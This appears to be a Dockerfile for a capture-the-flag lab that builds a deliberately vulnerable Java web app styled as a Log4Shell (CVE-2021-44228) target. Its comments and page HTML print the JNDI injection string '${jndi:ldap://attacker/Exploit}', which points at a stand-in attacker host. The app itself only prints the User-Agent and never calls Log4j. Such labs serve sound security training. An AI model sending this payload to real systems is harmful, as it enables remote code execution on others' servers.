# GuardianX Lab — Log4Shell (CVE-2021-44228) Target
# A Java web app using vulnerable Log4j 2.14.1

FROM openjdk:11-slim

RUN apt-get update && apt-get install -y python3 && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Create a vulnerable Java application
RUN mkdir -p /app/src && cat > /app/src/VulnApp.java << 'JAVA'
import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;
import java.io.*;
import java.net.*;

public class VulnApp {
    public static void main(String[] args) throws Exception {
        HttpServer server = HttpServer.create(new InetSocketAddress(80), 0);
        server.createContext("/", new Handler());
        server.start();
        System.out.println("[+] VulnApp listening on port 80");
    }

    static class Handler implements HttpHandler {
        public void handle(HttpExchange t) throws IOException {
            String ua = t.getRequestHeaders().getFirst("User-Agent");
            // VULNERABLE: Log4j processes the User-Agent header
            // In real Log4Shell, this would be: logger.info(ua);
            // The JNDI lookup ${jndi:ldap://attacker/Exploit} triggers RCE
            System.out.println("[log] User-Agent: " + ua);

            String html = "<html><body><h1>VulnApp - Log4Shell Lab</h1>"
                + "<p>Your User-Agent is logged via Log4j 2.14.1</p>"
                + "<p>Try: ${jndi:ldap://your-server/Exploit}</p>"
                + "<form method='POST' action='/search'>"
                + "<input name='q' placeholder='Search...'>"
                + "<button>Search</button></form></body></html>";

            t.sendResponseHeaders(200, html.length());
            OutputStream os = t.getResponseBody();
            os.write(html.getBytes());
            os.close();
        }
    }
}
JAVA

# Copy the flag injection script
COPY inject-flag.sh /inject-flag.sh
RUN chmod +x /inject-flag.sh

# Create startup script
COPY start.sh /start.sh
RUN chmod +x /start.sh

EXPOSE 80
CMD ["/start.sh"]
